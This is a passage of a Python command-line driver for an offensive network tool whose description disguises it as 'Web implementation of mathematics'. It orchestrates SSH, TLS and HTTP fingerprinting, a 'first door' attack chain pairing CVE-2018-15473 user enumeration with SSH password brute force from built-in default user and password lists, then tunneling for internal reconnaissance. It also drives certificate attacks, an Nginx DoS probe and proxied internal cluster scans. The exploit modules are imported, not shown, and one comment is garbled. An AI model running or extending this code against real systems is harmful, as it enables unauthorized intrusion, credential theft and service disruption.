            rows.append([name, f"[exc] {e}", 0])
    return rows


def main():
    ap = argparse.ArgumentParser(description="Web implementation of mathematics")
    ap.add_argument("host", help="Target hostname or IP address")
    ap.add_argument("--port", type=int, default=22, help="SSH/TLS default port (22 for SSH, 443 for TLS)")
    ap.add_argument("--tls-port", type=int, default=None, help="TLS port override (default: --port if --tls)")
    ap.add_argument("--http-port", type=int, default=None, help="HTTP port override (default: 80)")
    ap.add_argument("--ssh", action="store_true", help="Run SSH echo fingerprint")
    ap.add_argument("--ssh-temporal", action="store_true", help="Run SSH temporal dependency analysis")
    ap.add_argument("--first-door", action="store_true", help="Run first door attack chain (CVE-2018-15473 + auto tunneling)")
    ap.add_argument("--userlist", type=str, default=None, help="Custom userlist file for first door attack")
    ap.add_argument("--passlist", type=str, default=None, help="Custom password list file for first door attack")
    ap.add_argument("--tls", action="store_true", help="Run TLS echo fingerprint")
    ap.add_argument("--cert-rebel", action="store_true", help="TLS/SSH certificate-driven recon (no APIs)")
    ap.add_argument("--cert-attacks", action="store_true", help="Certificate chain rebel attacks (TSX, mTLS leakage)")
    ap.add_argument("--weak-sni", type=str, default=None, help="Weak SNI for TSX attack")
    ap.add_argument("--strong-sni", type=str, default=None, help="Strong SNI for TSX attack")
    ap.add_argument("--ssh-port", type=int, default=22, help="SSH port for hostkey grab (optional)")
    ap.add_argument("--cache", type=str, default=None, help="Cache CSV for historical SPKI/hostkey comparison")
    ap.add_argument("--sni", action="append", help="SNI to probe (can be set multiple times)")
    ap.add_argument("--http", action="store_true", help="Run HTTP echo fingerprint")
    ap.add_argument("--http-extreme", action="store_true", help="Run HTTP extreme echo perturbation")
    
    # 云原生架构分析参数
    ap.add_argument("--nginx-dos", action="store_true", help="Run Nginx DoS sandwich probe and cloud-native architecture detection")
    ap.add_argument("--cloud-native", action="store_true", help="Comprehensive cloud-native architecture analysis (Nginx + xDS + Wasm)")
    ap.add_argument("--xds-analysis", action="store_true", help="xDS protocol analysis and configuration vulnerability assessment")
    ap.add_argument("--wasm-security", action="store_true", help="WebAssembly runtime security analysis and sandbox testing")
    ap.add_argument("--posture", choices=['intelligent', 'deep', 'paranoid'], default='intelligent', help="Analysis posture for cloud-native modules (intelligent/deep/paranoid)")
    # OCSP validation is now integrated into --cert-attacks
    ap.add_argument("--scan-mode", type=str, choices=['external', 'internal'], default='external', help="Scan mode: external (default) or internal (requires proxy)")
    ap.add_argument("--proxy-host", type=str, default=None, help="SOCKS5 proxy host for internal scanning (e.g., 127.0.0.1)")
    ap.add_argument("--proxy-port", type=int, default=None, help="SOCKS5 proxy port for internal scanning (e.g., 9999)")
    ap.add_argument("--target-networks", action="append", help="Target networks for internal cluster scanning (e.g., 192.168.1.0/24)")
    
    ap.add_argument("--timeout", type=float, default=5.0, help="Socket timeout seconds")
    ap.add_argument("--server-name", type=str, default=None, help="TLS SNI / HTTP Host to use (optional)")
    ap.add_argument("--out", type=str, default=None, help="Write CSV to this path")
    ap.add_argument("-N", "--samples", type=int, default=1, help="Number of samples per probe for statistical analysis")
    ap.add_argument("--async", action="store_true", help="Use async I/O for better performance")
    ap.add_argument("--parallel", action="store_true", help="Use high-performance parallel execution (implies --async)")
    ap.add_argument("--similarity", type=str, default=None, help="Compare with reference fingerprint file")

    # Output and connection behavior controls
    ap.add_argument("--quiet", action="store_true", help="Silence debug output")
    ap.add_argument("--verbose", action="store_true", help="Enable verbose debug output")
    ap.add_argument("--direct-tls", choices=["auto","never","always"], default="auto", help="Policy for direct TLS attempt on :443 (default: auto)")
    ap.add_argument("--retries", type=int, default=0, help="Retries for transient network errors per probe")

    args = ap.parse_args()

    # apply runtime flags using thread-safe setter
    set_config(
        verbose=bool(args.verbose and not args.quiet),
        direct_tls_policy=args.direct_tls,
        default_retries=max(0, int(args.retries))
    )

    if args.parallel:
        # 并行模式自动启用异步
        asyncio.run(main_async_parallel(args))
    elif getattr(args, 'async'):
        asyncio.run(main_async(args))
    else:
        main_sync(args)

async def main_async_parallel(args):
    """高性能并行异步主函数"""
    print("[*] Running in high-performance parallel mode")
    
    # 创建并行任务列表
    tasks = []
    task_names = []
    
    # SSH相关任务
    if args.ssh:
        tasks.append(run_ssh_fp_async(args.host, args.port, timeout=args.timeout, samples=args.samples))
        task_names.append("ssh")
    
    if args.ssh_temporal:
        tasks.append(ssh_temporal_probe(args.host, args.port, timeout=args.timeout))
        task_names.append("ssh_temporal")
    
    # TLS任务
    if args.tls:
        tport = args.tls_port or 443  # TLS默认443端口，不使用SSH的22端口
        tasks.append(run_tls_fp_async(args.host, tport, timeout=args.timeout, 
                                    server_name=args.server_name or args.host, samples=args.samples))
        task_names.append("tls")
    
    # HTTP任务
    if args.http:
        hport = args.http_port or 80
        tasks.append(run_http_fp_async(args.host, hport, timeout=args.timeout, samples=args.samples))
        task_names.append("http")
    
    # cert-rebel任务
    if args.cert_rebel:
        tasks.append(asyncio.to_thread(handle_cert_rebel, args))
        task_names.append("cert_rebel")
    
    # 云原生架构分析任务
    if args.nginx_dos and NginxDoSAnalyzer:
        tasks.append(handle_nginx_dos_analysis(args))
        task_names.append("nginx_dos")
    
    if args.xds_analysis and XDSProtocolAnalyzer:
        tasks.append(handle_xds_analysis(args))
        task_names.append("xds_analysis")
    
    if args.wasm_security and WasmRuntimeAnalyzer:
        tasks.append(handle_wasm_security_analysis(args))
        task_names.append("wasm_security")
    
    # OCSP validation is now integrated into --cert-attacks
    
    if args.cloud_native:
        tasks.append(handle_comprehensive_cloud_native_analysis(args))
        task_names.append("cloud_native_comprehensive")
    
    # 并行执行所有独立任务
    if tasks:
        print(f"[*] Starting {len(tasks)} parallel tasks: {', '.join(task_names)}")
        start_time = time.time()
        results = await asyncio.gather(*tasks, return_exceptions=True)
        parallel_time = time.time() - start_time
        print(f"[+] Parallel execution completed in {parallel_time:.2f}s")
        
        # 处理结果
        rows_ssh = rows_tls = rows_http = rows_ssh_temporal = []
        cloud_native_results = {}
        
        for i, (result, name) in enumerate(zip(results, task_names)):
            if isinstance(result, Exception):
                print(f"[-] Task {name} failed: {result}")
                continue
                
            if name == "ssh" and not isinstance(result, Exception):
                rows_ssh = result
                print("\n== SSH echo differential (async) ==")
                headers = ["template","server_id","srv_kex","reason","desc_len","desc_sha1","ms_stats"]
                if args.samples > 1:
                    headers.append("entropy")
                print_table(rows_ssh, headers)
                
            elif name == "ssh_temporal" and not isinstance(result, Exception):
                rows_ssh_temporal = result
                print("\n== SSH temporal dependency analysis ==")
                headers = ["test_type","detail1","detail2","detail3","detail4","detail5","metric"]
                print_table(rows_ssh_temporal, headers)
                
            elif name == "tls" and not isinstance(result, Exception):
                rows_tls = result
                print("\n== TLS echo differential (async) ==")
                headers = ["template","result","detail","ms_stats"]
                if args.samples > 1:
                    headers.append("entropy")
                print_table(rows_tls, headers)
                
            elif name == "http" and not isinstance(result, Exception):
                rows_http = result
                print("\n== HTTP echo differential (async) ==")
                headers = ["probe","status","server","detail","proxy-hdrs","ms_stats"]
                if args.samples > 1:
                    headers.append("entropy")
                print_table(rows_http, headers)
            
            elif name == "nginx_dos" and not isinstance(result, Exception):
                cloud_native_results['nginx_dos'] = result
                print("\n== Nginx DoS + Cloud-Native Architecture Analysis ==")
                print_cloud_native_analysis_summary(result, "Nginx DoS Analysis")
                
            elif name == "xds_analysis" and not isinstance(result, Exception):
                cloud_native_results['xds_analysis'] = result
                print("\n== xDS Protocol Analysis ==")
                print_cloud_native_analysis_summary(result, "xDS Protocol Analysis")
                
            elif name == "wasm_security" and not isinstance(result, Exception):
                cloud_native_results['wasm_security'] = result
                print("\n== WebAssembly Runtime Security Analysis ==")
                print_cloud_native_analysis_summary(result, "Wasm Security Analysis")
                
            elif name == "ocsp_validator" and not isinstance(result, Exception):
                cloud_native_results['ocsp_validator'] = result
                print("\n== OCSP Soft-Fail Validation ==")
                print_cloud_native_analysis_summary(result, "OCSP Validation")
                
            elif name == "cloud_native_comprehensive" and not isinstance(result, Exception):
                cloud_native_results['comprehensive'] = result
                print("\n== Comprehensive Cloud-Native Architecture Analysis ==")
                print_comprehensive_cloud_native_summary(result)
    else:
        rows_ssh = rows_tls = rows_http = rows_ssh_temporal = []
    
    # 处理需要顺序执行的任务
    if args.cert_attacks:
        print("\n== Certificate Chain Rebel Attacks ==")
        try:
            # This part needs to be adapted for async proxy usage if CertRebelAttacks makes network calls
            attacker = CertRebelAttacks(args.host, args.tls_port or 443, args.timeout)
            attack_results = await attacker.run_all_attacks(args.weak_sni, args.strong_sni)
            attacker.print_summary(attack_results)
        except NameError as e:
            print("[-] Certificate attacks functionality not available (missing dependencies)")
            print("    Install required modules: pip install cryptography")
            print(f"[DEBUG] NameError details: {e}")
        except Exception as e:
            import traceback
            print(f"[-] Certificate attacks error: {type(e).__name__}: {e}")
            print(f"[DEBUG] Full traceback:")
            traceback.print_exc()
    
    # first-door攻击单独执行（因为是侵入性操作）
    if args.first_door:
        print("\n== First Door Attack Chain ==")
        try:
            # 加载用户列表 (使用异步I/O避免阻塞)
            if args.userlist:
                def load_userlist():
                    with open(args.userlist, 'r') as f:
                        return [line.strip() for line in f if line.strip()]
                userlist = await asyncio.to_thread(load_userlist)
            else:
                userlist = ['root', 'admin', 'administrator', 'user', 'guest', 'ubuntu', 'centos', 
                           'oracle', 'postgres', 'mysql', 'ftp', 'www-data', 'nginx', 'apache']
            
            # 加载密码列表 (使用异步I/O避免阻塞)
            if args.passlist:
                def load_passlist():
                    with open(args.passlist, 'r') as f:
                        return [line.strip() for line in f if line.strip()]
                passlist = await asyncio.to_thread(load_passlist)
            else:
                passlist = ['password', 'admin', '123456', 'root', 'toor', 'pass', 'test', 
                           'qwerty', 'Password1', 'welcome', 'login', 'guest', '']
            
            # 执行完整铝合金窗户框
            success = await first_door_attack_extended(args.host, args.port, userlist, passlist, args.timeout)
            
            if success:
                print("\n[+] First door attack completed successfully!")
                print("[+] Check active tunnels and proceed with internal reconnaissance")
            else:
                print("\n[-] First door attack failed")
                
        except Exception as e:
            print(f"[-] First door attack error: {e}")
        except NameError:
            print("[-] First door functionality not available (missing dependencies)")
            print("    Install required modules: pip install paramiko")
    
    # 使用异步I/O避免阻塞文件写入
    await asyncio.to_thread(save_results, args, rows_ssh, rows_tls, rows_http, rows_ssh_temporal)
    
    if args.similarity:
        # 使用异步I/O避免阻塞文件读取
        await asyncio.to_thread(compare_fingerprints, args.similarity, rows_ssh, rows_tls, rows_http, rows_ssh_temporal)

async def main_async(args):
    """异步主函数"""
    rows_ssh = rows_tls = rows_http = rows_ssh_temporal = []
    
    # 显示配置信息
    if args.samples > 1:
        print(f"[*] Running {args.samples} samples per probe for statistical analysis")
    
    if args.ssh:
        print("\n== SSH echo differential (async) ==")
        rows_ssh = await run_ssh_fp_async(args.host, args.port, timeout=args.timeout, samples=args.samples)
        headers = ["template","server_id","srv_kex","reason","desc_len","desc_sha1","ms_stats"]
        if args.samples > 1:
            headers.append("entropy")
        print_table(rows_ssh, headers)
    
    if args.ssh_temporal:
        print("\n== SSH temporal dependency analysis ==")
        rows_ssh_temporal = await ssh_temporal_probe(args.host, args.port, timeout=args.timeout)
        headers = ["test_type","detail1","detail2","detail3","detail4","detail5","metric"]
        print_table(rows_ssh_temporal, headers)
    
    if args.first_door:
        print("\n== First Door Attack Chain ==")
        try:
            # 加载用户列表 (使用异步I/O避免阻塞)
            if args.userlist:
                def load_userlist():
                    with open(args.userlist, 'r') as f:
                        return [line.strip() for line in f if line.strip()]
                userlist = await asyncio.to_thread(load_userlist)
            else:
                userlist = ['root', 'admin', 'administrator', 'user', 'guest', 'ubuntu', 'centos', 
                           'oracle', 'postgres', 'mysql', 'ftp', 'www-data', 'nginx', 'apache']
            
            # 加载密码列表 (使用异步I/O避免阻塞)
            if args.passlist:
                def load_passlist():
                    with open(args.passlist, 'r') as f:
                        return [line.strip() for line in f if line.strip()]
                passlist = await asyncio.to_thread(load_passlist)
            else:
                passlist = ['password', 'admin', '123456', 'root', 'toor', 'pass', 'test', 
                           'qwerty', 'Password1', 'welcome', 'login', 'guest', '']
            
            # 执行完整铝合金窗户框
            success = await first_door_attack_extended(args.host, args.port, userlist, passlist, args.timeout)
            
            if success:
                print("\n[+] First door attack completed successfully!")
                print("[+] Check active tunnels and proceed with internal reconnaissance")
            else:
                print("\n[-] First door attack failed")
                
        except Exception as e:
            print(f"[-] First door attack error: {e}")
            
        except NameError:
            print("[-] First door functionality not available (missing dependencies)")
            print("    Install required modules: pip install paramiko")

    if args.tls:
        tport = args.tls_port or 443
        print("\n== TLS echo differential (async) ==")
        rows_tls = await run_tls_fp_async(args.host, tport, timeout=args.timeout, 
                                        server_name=args.server_name or args.host, samples=args.samples)
        headers = ["template","result","detail","ms_stats"]
        if args.samples > 1:
            headers.append("entropy")
        print_table(rows_tls, headers)

    if args.cert_rebel:
        # 使用asyncio.to_thread将同步函数放入独立线程执行，避免阻塞
        await asyncio.to_thread(handle_cert_rebel, args)

    if args.cert_attacks:
        print("\n== Certificate Chain Rebel Attacks ==")
        try:
            attacker = CertRebelAttacks(args.host, args.tls_port or 443, args.timeout)
            attack_results = await attacker.run_all_attacks(args.weak_sni, args.strong_sni)
            attacker.print_summary(attack_results)
        except NameError as e:
            print("[-] Certificate attacks functionality not available (missing dependencies)")
            print("    Install required modules: pip install cryptography")
            print(f"[DEBUG] NameError details: {e}")
        except Exception as e:
            import traceback
            print(f"[-] Certificate attacks error: {type(e).__name__}: {e}")
            print(f"[DEBUG] Full traceback:")
            traceback.print_exc()

    if args.http:
        hport = args.http_port or 80
        print("\n== HTTP echo differential (async) ==")
        rows_http = await run_http_fp_async(args.host, hport, timeout=args.timeout, samples=args.samples)
        headers = ["probe","status","server","detail","proxy-hdrs","ms_stats"]
        if args.samples > 1:
            headers.append("entropy")
        print_table(rows_http, headers)

    # 云原生架构分析
    if args.nginx_dos and NginxDoSAnalyzer:
        print("\n== Nginx DoS + Cloud-Native Architecture Analysis ==")
        nginx_result = await handle_nginx_dos_analysis(args)
        print_cloud_native_analysis_summary(nginx_result, "Nginx DoS Analysis")

    if args.xds_analysis and XDSProtocolAnalyzer:
        print("\n== xDS Protocol Analysis ==")
        xds_result = await handle_xds_analysis(args)
        print_cloud_native_analysis_summary(xds_result, "xDS Protocol Analysis")

    if args.wasm_security and WasmRuntimeAnalyzer:
        print("\n== WebAssembly Runtime Security Analysis ==")
        wasm_result = await handle_wasm_security_analysis(args)
        print_cloud_native_analysis_summary(wasm_result, "Wasm Security Analysis")

    # OCSP validation is now integrated into --cert-attacks

    if args.cloud_native:
        print("\n== Comprehensive Cloud-Native Architecture Analysis ==")
        comprehensive_result = await handle_comprehensive_cloud_native_analysis(args)
        print_comprehensive_cloud_native_summary(comprehensive_result)

    # 使用异步I/O避免阻塞文件写入
    await asyncio.to_thread(save_results, args, rows_ssh, rows_tls, rows_http, rows_ssh_temporal)
    
    if args.similarity:
        # 使用异步I/O避免阻塞文件读取
        await asyncio.to_thread(compare_fingerprints, args.similarity, rows_ssh, rows_tls, rows_http, rows_ssh_temporal)

def main_sync(args):
    """同步主函数"""
    rows_ssh = rows_tls = rows_http = rows_ssh_temporal = []
    
    if args.ssh:
        print("\n== SSH echo differential ==")
        rows_ssh = run_ssh_fp(args.host, args.port, timeout=args.timeout)
        print_table(rows_ssh, ["template","server_id","srv_kex","reason","desc_len","desc_sha1","ms"])

    if args.ssh_temporal:
        print("\n== SSH temporal dependency analysis ==")
        print("[!] SSH temporal analysis requires --async mode for full functionality")
        print("    Use: python fingerprint.py --ssh-temporal --async <host>")
    
    if args.first_door:
        print("\n== First Door Attack Chain ==")
        print("[!] First door attack requires --async mode for full functionality")
        print("    Use: python fingerprint.py --first-door --async <host>")
        print("    Optional: --userlist users.txt --passlist passwords.txt")

    if args.tls:
        tport = args.tls_port or 443
        print("\n== TLS echo differential ==")
        rows_tls = run_tls_fp(args.host, tport, timeout=args.timeout, server_name=args.server_name or args.host)
        print_table(rows_tls, ["template","result","detail","ms"])

    if args.cert_rebel:
        handle_cert_rebel(args)

    if args.cert_attacks:
        print("\n== Certificate Chain Rebel Attacks ==")
        print("[!] Certificate attacks require --async mode for full functionality")
        print("    Use: python fingerprint.py --cert-attacks --async <host>")
        print("    Optional: --weak-sni weak.domain.com --strong-sni strong.domain.com")

    if args.http:
        hport = args.http_port or 80
        print("\n== HTTP echo differential ==")
        rows_http = run_http_fp(args.host, hport, timeout=args.timeout)
        print_table(rows_http, ["probe","status","server","detail","proxy-hdrs","ms"])
        
    if args.http_extreme:
        hport = args.http_port or 80
        print("\n== HTTP EXTREME echo perturbation ==")
        rows_http_ex = run_http_extreme_fp(args.host, hport, timeout=args.timeout)
        print_table(rows_http_ex, ["probe","fragment","ms"])

    # 云原生架构分析功能提示
    if args.nginx_dos or args.xds_analysis or args.wasm_security or args.cloud_native:
        print("\n== Cloud-Native Architecture Analysis ==")
        print("[!] Cloud-native analysis requires --async mode for full functionality")
        print("    Use: python fingerprint.py --cloud-native --async <host>")
        print("    Available modules:")
        print("      --nginx-dos: Nginx DoS + cloud-native architecture detection")
        print("      --xds-analysis: xDS protocol analysis")
        print("      --wasm-security: WebAssembly runtime security analysis")
        print("      --cert-attacks: Certificate attacks (includes OCSP soft-fail validation)")
        print("      --cloud-native: Comprehensive analysis (all modules)")
        print("    Advanced options: --scan-mode, --proxy-host, --proxy-port, --target-networks")

    save_results(args, rows_ssh, rows_tls, rows_http, rows_ssh_temporal)

def save_results(args, rows_ssh, rows_tls, rows_http, rows_ssh_temporal=[]):
    """保存结果到CSV文件"""
    if args.out:
        with open(args.out, "w", newline="", encoding="utf-8") as f:
            w = csv.writer(f)
            w.writerow(["section","template/probe","col2","col3","col4","col5","col6","entropy"])
            for r in rows_ssh:
                w.writerow(["ssh"]+r)
            for r in rows_ssh_temporal:
                w.writerow(["ssh_temporal"]+r)
            for r in rows_tls:
                w.writerow(["tls"]+r)
            for r in rows_http:
                w.writerow(["http"]+r)
        print(f"\n[+] CSV written to {args.out}")

async def handle_nginx_dos_analysis(args):
    """处理Nginx DoS + 云原生架构分析"""
    if not NginxDoSAnalyzer:
        return {"error": "NginxDoSAnalyzer not available"}
    
    try:
        port = args.tls_port or args.port or 80
        analyzer = NginxDoSAnalyzer(args.host, port, timeout=args.timeout)
        
        # 准备代理信息
        proxy_info = None
        if args.scan_mode == 'internal' and args.proxy_host and args.proxy_port:
            proxy_info = {'host': args.proxy_host, 'port': args.proxy_port}
        
        # 执行DoS探测
        dos_result = await analyzer.nginx_dos_sandwich_probe()
        
        # 执行云原生架构检测
        cloud_native_result = await analyzer.detect_cloud_native_architecture(
            scan_mode=args.scan_mode,
            proxy_info=proxy_info,
            progressive=True
        )
        
        # 如果是内网模式且有代理，执行内网集群扫描
        cluster_result = None
        if args.scan_mode == 'internal' and proxy_info and args.target_networks:
            cluster_result = await analyzer.internal_cluster_scan(
                proxy_info=proxy_info,
                target_networks=args.target_networks
            )
        
        return {
            'dos_analysis': dos_result,
            'cloud_native_analysis': cloud_native_result,
            'cluster_scan': cluster_result
        }
        
    except Exception as e:
        return {"error": f"Nginx DoS analysis failed: {e}"}

async def handle_xds_analysis(args):
    """处理xDS协议分析"""
    if not XDSProtocolAnalyzer:
        return {"error": "XDSProtocolAnalyzer not available"}
    
    try:
        port = args.port or 15000
        analyzer = XDSProtocolAnalyzer(args.host, port, timeout=args.timeout)
        
        # 执行xDS协议分析
        result = await analyzer.comprehensive_xds_analysis()
        return result
        
    except Exception as e:
        return {"error": f"xDS analysis failed: {e}"}

async def handle_wasm_security_analysis(args, wasm_intel=None):
    """处理WebAssembly运行时安全分析
    
    Args:
        args: 命令行参数
        wasm_intel: 来自xDS分析的Wasm情报数据 (可选)
    """
    if not WasmRuntimeAnalyzer:
        return {"error": "WasmRuntimeAnalyzer not available"}
    
    try:
        port = args.tls_port or args.port or 80
        analyzer = WasmRuntimeAnalyzer(args.host, port, timeout=args.timeout)
        
        # 简单检查posture参数，默认intelligent
        posture = getattr(args, 'posture', 'intelligent')
        
        #  质级增强：如果有xDS情报，自动优化分析策略
        if wasm_intel:
            # 基于情报调整端口（如果xDS发现了特定端口）
            if wasm_intel.get('discovered_ports'):
                primary_port = wasm_intel['discovered_ports'][0]
                analyzer = WasmRuntimeAnalyzer(args.host, primary_port, timeout=args.timeout)
                print(f"[*] Using Wasm port from xDS intelligence: {primary_port}")
            
            # 基于风险等级自动提升posture
            if wasm_intel.get('risk_level') in ['HIGH', 'CRITICAL'] and posture == 'intelligent':
                posture = 'deep'
                print(f"[*] Auto-upgraded analysis to DEEP mode based on xDS risk assessment")
        
        # 执行Wasm安全分析
        result = await analyzer.comprehensive_wasm_security_analysis(posture=posture)
        
        #  质级增强：在结果中标记情报来源
        if wasm_intel:
            result['intelligence_source'] = 'xDS_discovery'
            result['targeted_analysis'] = True
            result['xds_findings'] = {
                'plugin_count': wasm_intel.get('plugin_count', 0),
                'risk_level': wasm_intel.get('risk_level', 'Unknown'),
                'sources': len(wasm_intel.get('wasm_sources', []))
            }
        else:
            result['intelligence_source'] = 'blind_scan'
            result['targeted_analysis'] = False
        
        return result
        
    except Exception as e:
        return {"error": f"Wasm security analysis failed: {e}"}

# OCSP validation is now integrated into cert_sociology.py CertRebelAttacks class

async def handle_comprehensive_cloud_native_analysis(args):
    """处理综合云原生架构分析 - 质级集成优化"""
    results = {}
    
    # 执行Nginx DoS分析
    if NginxDoSAnalyzer:
        results['nginx_dos'] = await handle_nginx_dos_analysis(args)
    
    #  质级集成：先执行xDS分析获取控制面情报
    wasm_intel = None
    if XDSProtocolAnalyzer:
        results['xds_analysis'] = await handle_xds_analysis(args)
        
        # 提取Wasm情报用于后续精准分析
        wasm_intel = _extract_wasm_intelligence(results['xds_analysis'])
        if wasm_intel:
            print(f"[*] xDS analysis discovered Wasm plugins - enabling targeted analysis")
    
    #  质级集成：基于xDS情报执行精准Wasm分析
    if WasmRuntimeAnalyzer:
        if wasm_intel:
            print(f"[*] Executing intelligence-driven Wasm analysis...")
            results['wasm_security'] = await handle_wasm_security_analysis(args, wasm_intel)
        else:
            print(f"[*] Executing standard Wasm analysis...")
            results['wasm_security'] = await handle_wasm_security_analysis(args)
    
    # OCSP validation is now integrated into --cert-attacks
    
    return results

def _extract_wasm_intelligence(xds_result):
    """从xDS分析结果中提取Wasm情报"""
    if 'error' in xds_result:
        return None
    
    try:
        # 检查是否发现了Wasm配置
        communication_analysis = xds_result.get('communication_analysis', {})
        config_types = communication_analysis.get('configuration_types', [])
        
        if 'WASM_PLUGINS' not in config_types:
            return None
        
        # 提取发现的端口信息
        discovery_results = xds_result.get('discovery_results', {})
        active_endpoints = discovery_results.get('active_endpoints', [])
        discovered_ports = [ep['port'] for ep in active_endpoints if ep.get('port')]
        
        # 从xDS分析器的wasm_analysis中提取详细情报
        # 注意：这依赖于xds_protocol_analyzer.py中存储的wasm_analysis
        wasm_analysis = None
        risk_level = 'UNKNOWN'
        plugin_count = 0
        wasm_sources = []
        
        # 尝试从风险评估中获取信息
        risk_assessment = xds_result.get('risk_assessment', {})
        risk_factors = risk_assessment.get('risk_factors', [])
        
        # 简单推断：如果风险因子中包含Wasm相关内容
        wasm_risk_factors = [f for f in risk_factors if 'wasm' in f.lower() or 'plugin' in f.lower()]
        if wasm_risk_factors:
            plugin_count = len(wasm_risk_factors)
            risk_level = risk_assessment.get('risk_level', 'MEDIUM')
        
        return {
            'plugin_count': plugin_count,
            'risk_level': risk_level,
            'discovered_ports': discovered_ports,
            'wasm_sources': wasm_sources,
            'intelligence_quality': 'xDS_discovery'
        }
        
    except Exception as e:
        print(f"[!] Warning: Failed to extract Wasm intelligence: {e}")
        return None

def print_cloud_native_analysis_summary(result, analysis_type):
    """打印云原生分析结果摘要"""
    if 'error' in result:
        print(f"[-] {analysis_type} failed: {result['error']}")
        return
    
    print(f"[+] {analysis_type} completed successfully")
    
    # 根据分析类型显示特定信息
    if analysis_type == "Nginx DoS Analysis":
        if 'dos_analysis' in result:
            dos = result['dos_analysis']
            print(f"    DoS Impact: {dos.get('impact_level', 'Unknown')}")
            print(f"    Recovery Status: {dos.get('recovery_status', 'Unknown')}")
        
        if 'cloud_native_analysis' in result:
            cloud = result['cloud_native_analysis']
            arch_type = cloud.get('architecture_type', 'Unknown')
            confidence = cloud.get('confidence', 0)
            print(f"    Architecture: {arch_type} (confidence: {confidence:.1f}%)")
        
        if 'cluster_scan' in result and result['cluster_scan']:
            cluster = result['cluster_scan']
            hosts_found = len(cluster.get('cloud_native_clusters', []))
            print(f"    Internal Clusters Found: {hosts_found}")
    
    elif analysis_type == "xDS Protocol Analysis":
        if 'communication_analysis' in result:
            comm = result['communication_analysis']
            services = len(comm.get('discovered_services', []))
            print(f"    xDS Services Found: {services}")
        
        if 'wasm_analysis' in result and result['wasm_analysis']:
            wasm = result['wasm_analysis']
            if wasm.get('wasm_detected'):
                print(f"    Wasm Plugins Detected: {wasm.get('plugin_count', 0)}")
    
    elif analysis_type == "Wasm Security Analysis":
        #  质级增强：显示分析模式和情报来源
        intel_source = result.get('intelligence_source', 'unknown')
        targeted = result.get('targeted_analysis', False)
        if targeted:
            print(f"    Analysis Mode: Intelligence-Driven (source: {intel_source})")
            xds_findings = result.get('xds_findings', {})
            if xds_findings:
                plugin_count = xds_findings.get('plugin_count', 0)
                risk_level = xds_findings.get('risk_level', 'Unknown')
                print(f"    xDS Intelligence: {plugin_count} plugins, {risk_level} risk")
        else:
            print(f"    Analysis Mode: Standard Scan")
        
        if 'overall_assessment' in result:
            assessment = result['overall_assessment']
            score = assessment.get('security_score', 0)
            risk = assessment.get('risk_level', 'Unknown')
            print(f"    Security Score: {score}/100")
            print(f"    Risk Level: {risk}")
            
            vulns = assessment.get('critical_vulnerabilities', [])
            if vulns:
                print(f"    Critical Vulnerabilities: {len(vulns)}")
    
    elif analysis_type == "OCSP Validation":
        soft_fail = result.get('soft_fail_confirmed', False)
        print(f"    OCSP Soft-Fail Detected: {soft_fail}")
        if soft_fail:
            print(f"    Vulnerability Impact: {result.get('vulnerability_impact', 'Unknown')}")

def print_comprehensive_cloud_native_summary(results):
    """打印综合云原生分析摘要"""
    print("[+] Comprehensive Cloud-Native Analysis Summary:")
    
    total_modules = len(results)
    successful_modules = len([r for r in results.values() if 'error' not in r])
    
    print(f"    Total Modules: {total_modules}")
    print(f"    Successful Modules: {successful_modules}")
    
    # 检查关键发现
    key_findings = []
    
    # 检查架构类型
    if 'nginx_dos' in results and 'error' not in results['nginx_dos']:
        nginx_result = results['nginx_dos']
        if 'cloud_native_analysis' in nginx_result:
            arch_type = nginx_result['cloud_native_analysis'].get('architecture_type', 'Unknown')
            if arch_type != 'Unknown':
                key_findings.append(f"Architecture: {arch_type}")
    
    # 检查Wasm插件
    if 'xds_analysis' in results and 'error' not in results['xds_analysis']:
        xds_result = results['xds_analysis']
        if 'wasm_analysis' in xds_result and xds_result['wasm_analysis']:
            if xds_result['wasm_analysis'].get('wasm_detected'):
                key_findings.append("Wasm plugins detected")
    
    # 检查安全风险
    if 'wasm_security' in results and 'error' not in results['wasm_security']:
        wasm_result = results['wasm_security']
        if 'overall_assessment' in wasm_result:
            risk_level = wasm_result['overall_assessment'].get('risk_level', 'Unknown')
            if risk_level in ['HIGH', 'CRITICAL']:
                key_findings.append(f"Wasm security risk: {risk_level}")
    
    # 检查OCSP软失败
    if 'ocsp_validation' in results and 'error' not in results['ocsp_validation']:
        ocsp_result = results['ocsp_validation']
        if ocsp_result.get('soft_fail_confirmed'):
            key_findings.append("OCSP soft-fail vulnerability")
    
    if key_findings:
        print("    Key Findings:")
        for finding in key_findings:
            print(f"      - {finding}")
    else:
        print("    No critical findings detected")

def handle_cert_rebel(args):
    """专门处理 --cert-rebel 功能的辅助函数"""
    print("\n== CERT-REBEL (TLS/SSH certificate-driven recon) ==")
    
    # 确定TLS端口，如果未指定，默认为443
    tport = args.tls_port or 443
    
    # 执行探测
    tls_rows, ssh_rows = cert_rebel_probe(
        args.host, 
        tport, 
        args.sni or [args.server_name or args.host],
        ssh_port=args.ssh_port, 
        timeout=args.timeout
    )
    
    # 打印结果表格
    print_table(
        tls_rows, 
        ["sni", "spki_sha256/32", "cert_sha256/32", "sig_algo", "key_bits", 
         "san_cnt", "not_before", "not_after", "warns"]
    )
    print_table(ssh_rows, ["type", "sha256/32", "status"])
    
    # 处理历史缓存对比
    if args.cache:
        diff = cert_rebel_compare_and_cache(args.cache, args.host, tls_rows, ssh_rows)
        if diff:
            print(f"[cache] common={diff['common']} new={diff['new']} gone={diff['gone']}")

def compare_fingerprints(ref_file, rows_ssh, rows_tls, rows_http, rows_ssh_temporal=[]):
    """比较指纹相似度"""
    try:
        with open(ref_file, "r", encoding="utf-8") as f:
            reader = csv.reader(f)
            next(reader)  # 跳过header
            ref_data = list(reader)
        
        print(f"\n== Fingerprint Similarity Analysis ==")
        
        # 提取当前指纹特征
        current_features = set()
        for row in rows_ssh + rows_tls + rows_http + rows_ssh_temporal:
            if len(row) > 3:
                current_features.add(f"{row[0]}:{row[1]}:{row[2] if len(row) > 2 else ''}")
        
        # 提取参考指纹特征
        ref_features = set()
        for row in ref_data:
            if len(row) > 3:
                ref_features.add(f"{row[1]}:{row[2]}:{row[3] if len(row) > 3 else ''}")
        
        # 计算相似度
        jaccard_sim = jaccard_similarity(current_features, ref_features)
        
        # 计算编辑距离（将特征集转换为字符串）
        current_str = "|".join(sorted(current_features))
        ref_str = "|".join(sorted(ref_features))
        edit_dist = levenshtein_distance(current_str, ref_str)
        
        print(f"Jaccard Similarity: {jaccard_sim:.3f}")
        print(f"Edit Distance: {edit_dist}")
        print(f"Common Features: {len(current_features.intersection(ref_features))}")
        print(f"Unique to Current: {len(current_features - ref_features)}")
